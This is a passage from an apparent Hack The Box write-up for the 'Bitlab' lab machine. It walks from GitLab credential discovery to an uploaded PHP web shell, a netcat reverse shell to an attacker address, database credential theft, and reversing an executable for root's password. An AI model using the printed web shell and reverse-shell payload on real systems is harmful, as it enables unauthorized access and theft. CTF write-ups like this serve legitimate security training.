&#x2F;*&#x2F;*.git</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;fork&#x2F;new</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;repository&#x2F;archive*</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;activity</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;new</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;edit</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;raw</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;blame</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;commits&#x2F;*&#x2F;*</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;commit&#x2F;*.patch</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;commit&#x2F;*.diff</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;compare</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;branches&#x2F;new</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;tags&#x2F;new</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;network</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;graphs</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;milestones&#x2F;new</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;milestones&#x2F;*&#x2F;edit</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;issues&#x2F;new</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;issues&#x2F;*&#x2F;edit</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;merge_requests&#x2F;new</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;merge_requests&#x2F;*.patch</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;merge_requests&#x2F;*.diff</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;merge_requests&#x2F;*&#x2F;edit</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;merge_requests&#x2F;*&#x2F;diffs</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;project_members&#x2F;import</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;labels&#x2F;new</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;labels&#x2F;*&#x2F;edit</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;wikis&#x2F;*&#x2F;edit</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;snippets&#x2F;new</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;snippets&#x2F;*&#x2F;edit</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;snippets&#x2F;*&#x2F;raw</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;deploy_keys</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;hooks</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;services</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;protected_branches</span><br><span class="line">Disallow: &#x2F;*&#x2F;*&#x2F;uploads&#x2F;</span><br><span class="line">Disallow: &#x2F;*&#x2F;-&#x2F;group_members</span><br><span class="line">Disallow: &#x2F;*&#x2F;project_members</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;bitlab#</span><br></pre></td></tr></table></figure><p>Most of the disallowed entries were paths related to the <code>Gitlab</code> application. I checked <code>/help</code> and found a page called <code>bookmarks.html</code>:<br><img src="/images/hackthebox/bitlab/2.png" alt=""><br>There was an interesting link called <code>Gitlab Login</code>:<br><img src="/images/hackthebox/bitlab/3.png" alt=""><br>Clicking on that link didn’t result in anything, so I checked the source of the page, the <code>href</code> attribute had some <code>javascript</code> code:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">DT</span>&gt;</span><span class="tag">&lt;<span class="name">A</span> <span class="attr">HREF</span>=<span class="string">"javascript:(function()&#123; var _0x4b18=[<span class="symbol">&amp;quot;</span>\x76\x61\x6C\x75\x65<span class="symbol">&amp;quot;</span>,<span class="symbol">&amp;quot;</span>\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E<span class="symbol">&amp;quot;</span>,<span class="symbol">&amp;quot;</span>\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64<span class="symbol">&amp;quot;</span>,<span class="symbol">&amp;quot;</span>\x63\x6C\x61\x76\x65<span class="symbol">&amp;quot;</span>,<span class="symbol">&amp;quot;</span>\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64<span class="symbol">&amp;quot;</span>,<span class="symbol">&amp;quot;</span>\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78<span class="symbol">&amp;quot;</span>];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; &#125;)()"</span> <span class="attr">ADD_DATE</span>=<span class="string">"1554932142"</span>&gt;</span>Gitlab Login<span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br></pre></td></tr></table></figure><p>I took that code, edited it a little bit and used the <code>js</code> console to execute it:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/bitlab# js</span><br><span class="line">&gt; <span class="keyword">var</span> _0x4b18=[<span class="string">'\x76\x61\x6C\x75\x65'</span>,<span class="string">'\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E'</span>,<span class="string">'\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64'</span>,<span class="string">'\x63\x6C\x61\x76\x65'</span>,<span class="string">'\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64'</span>,<span class="string">'\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78'</span>];<span class="built_in">document</span>[_0x4b18[<span class="number">2</span>]](_0x4b18[<span class="number">1</span>])[_0x4b18[<span class="number">0</span>]]= _0x4b18[<span class="number">3</span>];<span class="built_in">document</span>[_0x4b18[<span class="number">2</span>]](_0x4b18[<span class="number">4</span>])[_0x4b18[<span class="number">0</span>]]= _0x4b18[<span class="number">5</span>];</span><br><span class="line">Thrown:</span><br><span class="line"><span class="built_in">ReferenceError</span>: <span class="built_in">document</span> is not defined</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>Then I printed the variable <code>_0x4b18</code> which had the credentials for <code>Gitlab</code>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; _0x4b18</span><br><span class="line">[ <span class="string">'value'</span>,</span><br><span class="line">  <span class="string">'user_login'</span>,</span><br><span class="line">  <span class="string">'getElementById'</span>,</span><br><span class="line">  <span class="string">'clave'</span>,</span><br><span class="line">  <span class="string">'user_password'</span>,</span><br><span class="line">  <span class="string">'11des0081x'</span> ]</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><h2 id="File-Upload-–-gt-RCE-–-gt-Shell-as-www-data"><a href="#File-Upload-–-gt-RCE-–-gt-Shell-as-www-data" class="headerlink" title="File Upload –&gt; RCE –&gt; Shell as www-data"></a>File Upload –&gt; RCE –&gt; Shell as www-data</h2><p>After logging in with the credentials (<code>clave : 11des0081x</code>) I found two repositories, <code>Profile</code> and <code>Deployer</code>:<br><img src="/images/hackthebox/bitlab/4.png" alt=""></p><p><img src="/images/hackthebox/bitlab/5.png" alt=""><br>I also checked the <code>snippets</code> and I found an interesting code snippet that had the database credentials which will be useful later:<br><img src="/images/hackthebox/bitlab/6.png" alt=""></p><p><img src="/images/hackthebox/bitlab/7.png" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$db_connection = pg_connect(<span class="string">"host=localhost dbname=profiles user=profiles password=profiles"</span>);</span><br><span class="line">$result = pg_query($db_connection, <span class="string">"SELECT * FROM profiles"</span>);</span><br></pre></td></tr></table></figure><p>Back to the repositories, I checked <code>Profile</code> and it was pretty empty:<br><img src="/images/hackthebox/bitlab/8.png" alt=""><br>The path <code>/profile</code> was one of the disallowed entries in <code>/robots.txt</code>, I wanted to check if that path was related to the repository, so I checked if the same image (<code>developer.jpg</code>) existed, and it did:<br><img src="/images/hackthebox/bitlab/9.png" alt=""></p><p><img src="/images/hackthebox/bitlab/10.png" alt=""><br>Now we can simply upload a <code>php</code> shell and access it through <code>/profile</code>, I uploaded the <code>php-simple-backdoor</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Simple PHP backdoor by DK (http:<span class="comment">//michaeldaw.org) --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">        $cmd = ($_REQUEST[<span class="string">'cmd'</span>]);</span><br><span class="line">        system($cmd);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line">        <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Usage: http:<span class="comment">//target.com/simple-backdoor.php?cmd=cat+/etc/passwd</span></span><br><span class="line"></span><br><span class="line">&lt;!--    http:<span class="comment">//michaeldaw.org   2006    --&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/bitlab/11.png" alt=""></p><p><img src="/images/hackthebox/bitlab/12.png" alt=""></p><p><img src="/images/hackthebox/bitlab/13.png" alt=""></p><p><img src="/images/hackthebox/bitlab/14.png" alt=""><br>Then I merged it to the <code>master</code> branch:<br><img src="/images/hackthebox/bitlab/15.png" alt=""></p><p><img src="/images/hackthebox/bitlab/16.png" alt=""></p><p><img src="/images/hackthebox/bitlab/17.png" alt=""></p><p><img src="/images/hackthebox/bitlab/18.png" alt=""><br>I used the <a href="rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201337%20%3E%2Ftmp%2Ff"><code>netcat openbsd</code> reverse shell payload</a> from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener"><code>PayloadsAllTheThings</code></a> to get a shell, had to <code>urlencode</code> it first:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201337%20%3E%2Ftmp%2Ff</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;bitlab# nc -lvnp 1337</span><br><span class="line">listening on [any] 1337 ...</span><br><span class="line">connect to [10.10.xx.xx] from (UNKNOWN) [10.10.10.114] 44340</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line">$ which python</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">$ python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">www-data@bitlab:&#x2F;var&#x2F;www&#x2F;html&#x2F;profile$ ^Z</span><br><span class="line">[1]+  Stopped                 nc -lvnp 1337</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;bitlab# stty raw -echo</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;bitlab# nc -lvnp 1337</span><br><span class="line"></span><br><span class="line">www-data@bitlab:&#x2F;var&#x2F;www&#x2F;html&#x2F;profile$ export TERM&#x3D;screen</span><br><span class="line">www-data@bitlab:&#x2F;var&#x2F;www&#x2F;html&#x2F;profile$</span><br></pre></td></tr></table></figure><h2 id="Database-Access-–-gt-Clave’s-Password-–-gt-SSH-as-Clave-–-gt-User-Flag"><a href="#Database-Access-–-gt-Clave’s-Password-–-gt-SSH-as-Clave-–-gt-User-Flag" class="headerlink" title="Database Access –&gt; Clave’s Password –&gt; SSH as Clave –&gt; User Flag"></a>Database Access –&gt; Clave’s Password –&gt; SSH as Clave –&gt; User Flag</h2><p>After getting a shell as <code>www-data</code> I wanted to use the credentials I got earlier from the code snippet and see what was in the database, however <code>psql</code> wasn’t installed:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:&#x2F;var&#x2F;www&#x2F;html&#x2F;profile$ psql</span><br><span class="line">bash: psql: command not found</span><br><span class="line">www-data@bitlab:&#x2F;var&#x2F;www&#x2F;html&#x2F;profile$</span><br></pre></td></tr></table></figure><p>So I had to do it with <code>php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/<span class="keyword">var</span>/www/html/profile$ php -a</span><br><span class="line">Interactive mode enabled</span><br><span class="line"></span><br><span class="line">php &gt; $connection = <span class="keyword">new</span> PDO(<span class="string">'pgsql:host=localhost;dbname=profiles'</span>, <span class="string">'profiles'</span>, <span class="string">'profiles'</span>);</span><br></pre></td></tr></table></figure><p>I executed the same query from the code snippet which queried everything from the table <code>profiles</code>, and I got clave’s password which I could use to get <code>ssh</code> access:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $result = $connection-&gt;query(<span class="string">"SELECT * FROM profiles"</span>);</span><br><span class="line">php &gt; $profiles = $result-&gt;fetchAll();</span><br><span class="line">php &gt; print_r($profiles);</span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [id] =&gt; <span class="number">1</span></span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">            [username] =&gt; clave</span><br><span class="line">            [<span class="number">1</span>] =&gt; clave</span><br><span class="line">            [password] =&gt; c3NoLXN0cjBuZy1wQHNz==</span><br><span class="line">            [<span class="number">2</span>] =&gt; c3NoLXN0cjBuZy1wQHNz==</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">php &gt;</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/bitlab/19.png" alt=""><br>We owned user.</p><h2 id="Reversing-RemoteConnection-exe-–-gt-Root’s-Password-–-gt-SSH-as-Root-–-gt-Root-Flag"><a href="#Reversing-RemoteConnection-exe-–-gt-Root’s-Password-–-gt-SSH-as-Root-–-gt-Root-Flag" class="headerlink" title="Reversing RemoteConnection.exe –&gt; Root’s Password –&gt; SSH as Root –&gt;  Root Flag"></a>Reversing RemoteConnection.exe –&gt; Root’s Password –&gt; SSH as Root –&gt;  Root Flag</h2><p>In the home directory of clave there was a Windows executable called <code>RemoteConnection.exe</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">clave@bitlab:~$ ls -la</span><br><span class="line">total 44</span><br><span class="line">drwxr-xr-x 4 clave clave  4096 Aug  8 14:40 .</span><br><span class="line">drwxr-xr-x 3 root  root   4096 Feb 28  2019 ..</span><br><span class="line">lrwxrwxrwx 1 root  root      9 Feb 28  2019 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r-- 1 clave clave  3771 Feb 28  2019 .bashrc</span><br><span class="line">drwx------ 2 clave clave  4096 Aug  8 14:40 .cache</span><br><span class="line">drwx------ 3 clave clave  4096 Aug  8 14:40 .gnupg</span><br><span class="line">-rw-r--r-- 1 clave clave   807 Feb 28  2019 .profile</span><br><span class="line">-r-------- 1 clave clave 13824 Jul 30 19:58 RemoteConnection.exe</span><br><span class="line">-r-------- 1 clave clave    33 Feb 28  2019 user.txt</span><br><span class="line">clave@bitlab:~$</span><br></pre></td></tr></table></figure><p>I downloaded it on my box:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;bitlab# scp clave@bitlab.htb:&#x2F;home&#x2F;clave&#x2F;RemoteConnection.exe .&#x2F;</span><br><span class="line">clave@bitlab.htb&#39;s password: </span><br><span class="line">RemoteConnection.exe                                                                                                                                                                                     100%   14KB  16.5KB&#x2F;s   00:00    </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;bitlab#</span><br></pre></td></tr></table></figure><p>Then I started looking at the code decompilation with <code>Ghidra</code>. One function that caught my attention was <code>FUN_00401520()</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* WARNING: Could not reconcile some variable overlaps */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FUN_00401520</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  LPCWSTR pWVar1;</span><br><span class="line">  undefined4 ***pppuVar2;</span><br><span class="line">  LPCWSTR lpParameters;</span><br><span class="line">  undefined4 ***pppuVar3;</span><br><span class="line">  <span class="keyword">int</span> **in_FS_OFFSET;</span><br><span class="line">  uint in_stack_ffffff44;</span><br><span class="line">  undefined4 *puVar4;</span><br><span class="line">  uint uStack132;</span><br><span class="line">  undefined *local_74;</span><br><span class="line">  undefined *local_70;</span><br><span class="line">  <span class="keyword">wchar_t</span> *local_6c;</span><br><span class="line">  <span class="keyword">void</span> *local_68 [<span class="number">4</span>];</span><br><span class="line">  undefined4 local_58;</span><br><span class="line">  uint local_54;</span><br><span class="line">  <span class="keyword">void</span> *local_4c [<span class="number">4</span>];</span><br><span class="line">  undefined4 local_3c;</span><br><span class="line">  uint local_38;</span><br><span class="line">  undefined4 ***local_30 [<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">int</span> local_20;</span><br><span class="line">  uint local_1c;</span><br><span class="line">  uint local_14;</span><br><span class="line">  <span class="keyword">int</span> *local_10;</span><br><span class="line">  undefined *puStack12;</span><br><span class="line">  undefined4 local_8;</span><br><span class="line">  </span><br><span class="line">  local_8 = <span class="number">0xffffffff</span>;</span><br><span class="line">  puStack12 = &amp;LAB_004028e0;</span><br><span class="line">  local_10 = *in_FS_OFFSET;</span><br><span class="line">  uStack132 = DAT_00404018 ^ (uint)&amp;stack0xfffffffc;</span><br><span class="line">  *(<span class="keyword">int</span> ***)in_FS_OFFSET = &amp;local_10;</span><br><span class="line">  local_6c = (<span class="keyword">wchar_t</span> *)<span class="number">0x4</span>;</span><br><span class="line">  local_14 = uStack132;</span><br><span class="line">  GetUserNameW((LPWSTR)<span class="number">0x4</span>,(LPDWORD)&amp;local_6c);</span><br><span class="line">  local_38 = <span class="number">0xf</span>;</span><br><span class="line">  local_3c = <span class="number">0</span>;</span><br><span class="line">  local_4c[<span class="number">0</span>] = (<span class="keyword">void</span> *)((uint)local_4c[<span class="number">0</span>] &amp; <span class="number">0xffffff00</span>);</span><br><span class="line">  FUN_004018f0();</span><br><span class="line">  local_8 = <span class="number">0</span>;</span><br><span class="line">  FUN_00401260(local_68,local_4c);</span><br><span class="line">  local_74 = &amp;stack0xffffff60;</span><br><span class="line">  local_8._0_1_ = <span class="number">1</span>;</span><br><span class="line">  FUN_004018f0();</span><br><span class="line">  local_70 = &amp;stack0xffffff44;</span><br><span class="line">  local_8._0_1_ = <span class="number">2</span>;</span><br><span class="line">  puVar4 = (undefined4 *)(in_stack_ffffff44 &amp; <span class="number">0xffffff00</span>);</span><br><span class="line">  FUN_00401710(local_68);</span><br><span class="line">  local_8._0_1_ = <span class="number">1</span>;</span><br><span class="line">  FUN_00401040(puVar4);</span><br><span class="line">  local_8 = CONCAT31(local_8._1_3_,<span class="number">3</span>);</span><br><span class="line">  lpParameters = (LPCWSTR)FUN_00401e6d();</span><br><span class="line">  pppuVar3 = local_30[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> (local_1c &lt; <span class="number">0x10</span>) &#123;</span><br><span class="line">    pppuVar3 = local_30;</span><br><span class="line">  &#125;</span><br><span class="line">  pWVar1 = lpParameters;</span><br><span class="line">  pppuVar2 = local_30[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> (local_1c &lt; <span class="number">0x10</span>) &#123;</span><br><span class="line">    pppuVar2 = local_30;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (pppuVar2 != (undefined4 ***)(local_20 + (<span class="keyword">int</span>)pppuVar3)) &#123;</span><br><span class="line">    *pWVar1 = (short)*(<span class="keyword">char</span> *)pppuVar2;</span><br><span class="line">    pWVar1 = pWVar1 + <span class="number">1</span>;</span><br><span class="line">    pppuVar2 = (undefined4 ***)((<span class="keyword">int</span>)pppuVar2 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  lpParameters[local_20] = <span class="string">L'\0'</span>;</span><br><span class="line">  <span class="keyword">if</span> (local_6c == <span class="string">L"clave"</span>) &#123;</span><br><span class="line">    ShellExecuteW((HWND)<span class="number">0x0</span>,<span class="string">L"open"</span>,<span class="string">L"C:\\Program Files\\PuTTY\\putty.exe"</span>,lpParameters,(LPCWSTR)<span class="number">0x0</span></span><br><span class="line">                  ,<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    FUN_00401c20((<span class="keyword">int</span> *)cout_exref);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0xf</span> &lt; local_1c) &#123;</span><br><span class="line">    operator_delete(local_30[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  local_1c = <span class="number">0xf</span>;</span><br><span class="line">  local_20 = <span class="number">0</span>;</span><br><span class="line">  local_30[<span class="number">0</span>] = (undefined4 ***)((uint)local_30[<span class="number">0</span>] &amp; <span class="number">0xffffff00</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0xf</span> &lt; local_54) &#123;</span><br><span class="line">    operator_delete(local_68[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  local_54 = <span class="number">0xf</span>;</span><br><span class="line">  local_58 = <span class="number">0</span>;</span><br><span class="line">  local_68[<span class="number">0</span>] = (<span class="keyword">void</span> *)((uint)local_68[<span class="number">0</span>] &amp; <span class="number">0xffffff00</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0xf</span> &lt; local_38) &#123;</span><br><span class="line">    operator_delete(local_4c[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  *in_FS_OFFSET = local_10;</span><br><span class="line">  FUN_00401e78();</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It looked like it was checking if the name of the user running the program was clave, then It executed <code>PuTTY</code> with some parameters that I couldn’t see:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (local_6c == <span class="string">L"clave"</span>) &#123;</span><br><span class="line">    ShellExecuteW((HWND)<span class="number">0x0</span>,<span class="string">L"open"</span>,<span class="string">L"C:\\Program Files\\PuTTY\\putty.exe"</span>,lpParameters,(LPCWSTR)<span class="number">0x0</span></span><br><span class="line">                  ,<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>This is how the same part looked like in <code>IDA</code>:<br><img src="/images/hackthebox/bitlab/20.png" alt=""><br>I copied the executable to a Windows machine and I tried to run it, however it just kept crashing.<br>I opened it in <code>immunity debugger</code> to find out what was happening, and I found an access violation:<br><img src="/images/hackthebox/bitlab/21.png" alt=""><br>It happened before reaching the function I’m interested in so I had to fix it. What I did was simply replacing the instructions that caused that access violation with <code>NOP</code>s.<br>I had to set a breakpoint before the <code>cmp</code> instruction, so I searched for the word “clave” in the referenced text strings and I followed it in the disassembler:<br><img src="/images/hackthebox/bitlab/22.png" alt=""></p><p><img src="/images/hackthebox/bitlab/23.png" alt=""></p><p><img src="/images/hackthebox/bitlab/24.png" alt=""><br>Then I executed the program and whenever I hit an access violation I replaced the instructions with <code>NOP</code>s, it happened twice then I reached my breakpoint:<br><img src="/images/hackthebox/bitlab/25.png" alt=""></p><p><img src="/images/hackthebox/bitlab/26.png" alt=""></p><p><img src="/images/hackthebox/bitlab/27.png" alt=""></p><p>After reaching the breakpoint I could see the parameters that the program gives to <code>putty.exe</code> in both <code>eax</code> and <code>ebx</code>, It was starting an <code>ssh</code> session as root and I could see the password:<br><img src="/images/hackthebox/bitlab/28.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 